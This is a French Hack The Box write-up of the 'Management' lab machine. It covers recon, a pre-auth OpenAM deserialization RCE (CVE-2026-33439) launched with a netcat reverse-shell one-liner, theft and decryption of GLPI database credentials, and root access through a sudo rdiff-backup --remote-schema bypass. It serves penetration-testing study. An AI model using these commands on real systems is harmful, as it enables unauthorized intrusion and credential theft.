

# MANAGEMENT - HACK THE BOX MACHINE 

>ADRESSE IP : 10.129.204.65


### 1 - RECONNAISSANCE

``` PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.204.65/
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
|_http-title: Did not follow redirect to https://management.htb/
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
1689/tcp  open  java-rmi Java RMI
| rmi-dumpregistry: 
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:46763
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
4444/tcp  open  ssl/ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
| fingerprint-strings: 
|   DNSStatusRequestTCP, SSLSessionReq: 
|     Cannot decode the provided ASN.1 integer element because the length of the element value was not between one and four bytes (actual length was 0)
|     1.3.6.1.4.1.1466.20036
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
46763/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
```

**1-1 INSPECTION DU WEB **
```(function(){
  var KEY="C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=",FILE="assets/app.enc";
  function b64(s){var b=atob(s),a=new Uint8Array(b.length),i=0;for(;i<b.length;i++)a[i]=b.charCodeAt(i);return a;}
  function fail(){var a=document.getElementById("app");if(a)a.innerHTML='<div style="min-height:100dvh;display:grid;place-items:center;color:#94a6bb;font-family:ui-sans-serif,system-ui,sans-serif;text-align:center;padding:24px"><div><h1 style="color:#e7eef6;font-size:1.4rem;margin:0 0 10px">Secure browser required</h1><p>This portal renders over an encrypted channel. Enable JavaScript and load the site over HTTPS to continue.</p></div></div>';}
  if(!window.crypto||!crypto.subtle){return fail();}
  fetch(FILE,{cache:"no-store"}).then(function(r){if(!r.ok)throw 0;return r.text();}).then(function(t){
    var raw=b64(t.trim()),iv=raw.slice(0,12),ct=raw.slice(12);
    return crypto.subtle.importKey("raw",b64(KEY),{name:"AES-GCM"},false,["decrypt"]).then(function(k){
      return crypto.subtle.decrypt({name:"AES-GCM",iv:iv},k,ct);
    });
  }).then(function(buf){
    (0,eval)(new TextDecoder().decode(buf));
  }).catch(function(){fail();});
})();
```

Interessant, on va telecharger cette code et le code app.enc et le dechiffrer. On a ensuite des liens sso.management.htb 

Examinons les éléments importants :
><title>OpenAM</title>

Le portail utilise OpenAM.
>>var require = { urlArgs : "v=16.0.5",deps : ['main'] };

Cela indique :
- RequireJS pour charger les modules JavaScript.
- main comme module principal.
- v=16.0.5 comme paramètre de version des ressources.

| 1. Interprétation des résultats |          |                                 |
| ------------------------------- | -------- | ------------------------------- |
| Endpoint                        | Résultat | Interprétation                  |
| /openam                         | 302      | Redirection                     |
| /openam/json                    | 404      | Mauvais chemin API              |
| /json/serverinfo/*              | 200      | API accessible                  |
| /json/realms/root               | 404      | Chemin incorrect pour cette API |
| /openam/UI/Login                | 302      | Redirection                     |
| /openam/XUI/                    | 200      | Interface OpenAM accessibl      |
Le résultat le plus intéressant est celui-ci :

```
{
  "_id": "*",
  "domains": [".management.htb"],
  "cookieName": "iPlanetDirectoryPro",
  "secureCookie": false,
  "realm": "/",
  "forgotPassword": "false",
  "forgotUsername": "false",
  "selfRegistration": "false"
}
```
Ce que nous pouvons en déduire :
- Le realm principal est /.
- Le cookie de session OpenAM s'appelle iPlanetDirectoryPro.
- Le domaine de cookie annoncé est .management.htb.
- L'inscription et la récupération de compte sont désactivées dans cette configuration.

On a vu tout à l´heure un registre java rmi, on va l`analyser

**1-2 RECONNAISSANCE JAVA RMI

On va utiliser un remote guesser java 

```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ java -jar rmg-5.1.0-jar-with-dependencies.jar enum 10.129.204.65 46763
[+] RMI Registry Enumeration
[+]
[+] 	- Specified endpoint is not an RMI registry
[+] 	  Skipping registry related checks.
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- The remote server does not expose any codebases.
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Caught Exception containing 'no security manager' during RMI call.
[+] 	  --> The server does not use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught NoSuchObjectException during activate call (activator not present).
[+] 	  Configuration Status: Current Default
(venv) kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ java -jar rmg-5.1.0-jar-with-dependencies.jar enum 10.129.204.65 1689
[+] RMI registry bound names:
[+]
[+] 	- org.opends.server.protocols.jmx.client-unknown
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: 127.0.1.1:46763  CSF: RMISocketFactory  ObjID: [-3feab215:1a1d0519d9e:-7fff, -1998016570829543229]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- The remote server does not expose any codebases.
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Server complained that object cannot be casted to java.lang.String.
[+] 	  --> The type java.lang.String is unmarshalled via readString().
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- RMI registry uses readString() for unmarshalling java.lang.String.
[+] 	  This prevents useCodebaseOnly enumeration from remote.
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Registry rejected unbind call cause it was not sent from localhost.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Caught Exception containing 'no security manager' during RMI call.
[+] 	  --> The server does not use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enumeration:
[+]
[+] 	- RMI registry uses readString() for unmarshalling java.lang.String.
[+] 	  This prevents JEP 290 bypass enumeration from remote.
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught NoSuchObjectException during activate call (activator not present).
[+] 	  Configuration Status: Current Default
(venv) kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ 
```
Nous avons donc une relation entre deux ports :
- 1689 : registre RMI accessible.
- 46763 : endpoint JMX annoncé par le registre.

Un détail mérite notre attention :
>RMI registry uses readString()
>This prevents JEP 290 bypass enumeration from remote.


Cela signifie que RMG n'a pas pu effectuer certaines vérifications de contournement du filtrage JEP 290 à distance, car le registre utilise readString() pour traiter les chaînes Java.
Ce n'est pas une preuve que toutes les attaques de désérialisation sont impossibles, mais nous n'avons pas actuellement de vulnérabilité RMI démontrée.

**Une anomalie intéressante : l'adresse 127.0.1.1**
C'est probablement le point le plus intéressant de cette découverte.

Le serveur annonce :
>Endpoint: 127.0.1.1:46763

Or 127.0.1.1 est une adresse de boucle locale.

**Une dernier tentative**

```
(venv) kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum $TARGET 1689
[+] Checking available bound names:
[+]
[+] 	* org.opends.server.protocols.jmx.client-unknown (JMX endpoint: 127.0.1.1:46763)
[+]
[+] Checking for unauthorized access:
[+]
[+] 	- Caught unexpected java.lang.NullPointerException during login attempt.
[+] 	  Vulnerability Status: Undecided
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer accepted the payload class.
[+] 	  Configuration Status: Non Default
(venv) kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$
```
C'est confirmé, le JRMI n'est pas vulnerable

**1-4 REVENONS SUR OPENAM**
>Et si OPENAM est vulnerable ?

Version d'openam : v=16.0.5
>CVE ET CVSS : CVE-2026-33439 avec score 9.3

```
Updated: 2026-04-07
Published: 2026-04-07

Title: Pre-Authentication Remote Code Execution via `jato.clientSession` Deserialization in OpenAM
Description

Open Access Management (OpenAM) is an access management solution. Prior to 16.0.6, OpenIdentityPlatform OpenAM is vulnerable to pre-authentication Remote Code Execution (RCE) via unsafe Java deserialization of the jato.clientSession HTTP parameter. This bypasses the WhitelistObjectInputStream mitigation that was applied to the jato.pageSession parameter after CVE-2021-35464. An unauthenticated attacker can achieve arbitrary command execution on the server by sending a crafted serialized Java object as the jato.clientSession GET/POST parameter to any JATO ViewBean endpoint whose JSP contains <jato:form> tags (e.g., the Password Reset pages). This vulnerability is fixed in 16.0.6.
```
On a notre candidat ideal

## 2 - EXPLOITATION
Avec ce poc : https://github.com/infernosalex/CVE-2026-33439-Python-PoC/blob/main/exploit.py, on a pu faire :
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IPADRESS 4444 > /tmp/f'

```
On a eu notre reverse shell 
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.204.65 55470
/bin/sh: 0: can't access tty; job control turned off
$ whoami
openam
```

J'ai ensuite uploadé linpeas pour decouvrir une vecteur de privesc 
```
╔══════════╣ Kernel Modules Information (T1547.006)
══╣ DiagSpill SCTP kernel exposure (CVE-2026-74469) (T1068)
╚ https://access.redhat.com/security/vulnerabilities/RHSB-2026-011
Potentially vulnerable kernel 6.8.0-139-generic with SCTP diagnostics reachable (sctp: module; sctp_diag: module)
Local exploitation needs no capability or unprivileged user namespace; verify vendor backports
Mitigation: update the kernel, or hard-disable both sctp and sctp_diag if SCTP is unused

CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.36 | Tags: 1 | Rank: Fixed in stable 6.12.36
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.91 | Tags: 1 | Rank: Fixed in stable 6.12.91; exploit path is in the networking stack and may be mitigated by removing the relevant ESP modules
CVE: CVE-2026-46331 | Name: pedit COW | Match data: pkg=linux-kernel,ver>=5.18,ver<6.12.94 | Tags: 1 | Rank: Fixed in stable 6.12.94; exploit path uses the traffic-control act_pedit subsystem
CVE: CVE-2026-43499 | Name: GhostLock rtmutex UAF | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.86,CONFIG_FUTEX_PI=y | Tags: 1 | Rank: Fixed in stable 6.12.86; priority-inheritance futexes must be enabled
═╣ Kernel vulns found: 4
```
C'est une inforation interessante, surtout que c`est une vecteur d'attaque puissante, mais on continue notre exploration et énumération

```
$ ls /opt/glpi/config
config_db.php
glpicrypt.key
oauth.pem
oauth.pub
$ cat /opt/glpi/config/config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
$ 
```

Apres, on entre dans le base de donnees, on recupere les mots de passe chiffres et on les decode 

```
$ php -r "
\$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
\$ciphertext = base64_decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==');
\$nonce = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
\$data  = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
\$plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key);
echo \$plain . PHP_EOL;
"
```

on se connecte ensuite via shh avec owen 
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/hackthebox/management$ ssh owen@management.htb 
The authenticity of host 'management.htb (10.129.204.65)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'management.htb' (ED25519) to the list of known hosts.
owen@management.htb's password: 
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)

owen@management:~$ ls
user.txt
owen@management:~$ cat user.txt
f616a1d18954cee738f7f8bc695c2924
owen@management:~$ ls
user.txt
owen@management:~$ 

```

## PRIVILEGE ESCALATION 

```
owen@management:~$ sudo -l
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
owen@management:~$ ls /opt/backup
assets  index.html  rdiff-backup-data
owen@management:~$ file /opt/backup/rdiff-backup-data/
/opt/backup/rdiff-backup-data/: directory
owen@management:~$ ls  /opt/backup/rdiff-backup-data/
ls: cannot open directory '/opt/backup/rdiff-backup-data/': Permission denied
owen@management:~$ 
```

Une technique connue consiste à exploiter --remote-schema : cette option permet à rdiff-backup de construire la commande qui démarre son processus serveur distant.

Si le programme accepte plusieurs occurrences de --restrict-path et conserve la dernière valeur, il devient possible de remplacer /opt/backup par /. 

```
owen@management:~$ rdiff-backup --version
rdiff-backup --help | grep -E 'remote-schema|restrict-path|restrict-mode'
rdiff-backup 2.2.6
                    [--parsable-output] [--remote-schema REMOTE_SCHEMA]
  --remote-schema REMOTE_SCHEMA
owen@management:~$ rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.

NOTE: Starting mirror from source path /root to destination path /tmp/root_backup
```

Voici ce qui se passe :
1. --remote-schema définit la commande du processus serveur.
2. %s est remplacé par le nom d'hôte extrait de la source distante.
3. Avec /::/root, cette substitution fournit /.
4. Le serveur reçoit donc deux options --restrict-path : d'abord /opt/backup, puis /.
5. Si la dernière valeur l'emporte, la restriction initiale est contournée.

```
owen@management:~$ ls -la /tmp/root_backup
total 44
drwx------  7 owen owen 4096 Nov 12 15:11 .
drwxrwxrwt 18 root root 4096 Nov 12 18:24 ..
lrwxrwxrwx  1 owen owen    9 Nov 12 18:24 .bash_history -> /dev/null
-rw-r--r--  1 owen owen 3106 Apr 22  2024 .bashrc
drwx------  3 owen owen 4096 Sep  7 11:41 .cache
drwx------  3 owen owen 4096 Sep  7 11:41 .config
drwxr-xr-x  3 owen owen 4096 Sep  7 11:41 .local
-rw-r--r--  1 owen owen  161 Apr 22  2024 .profile
drwx------  2 owen owen 4096 Sep  7 11:41 .ssh
-rw-r--r--  1 owen owen  177 Sep  7 11:06 .wget-hsts
drwx------  3 owen owen 4096 Nov 12 18:24 rdiff-backup-data
-rw-r-----  1 owen owen   33 Nov 12 15:11 root.txt
owen@management:~$ cat /tmp/root_backup/root.txt 
e7ee36614cee6a030633cf1502501993
owen@management:~$ 

```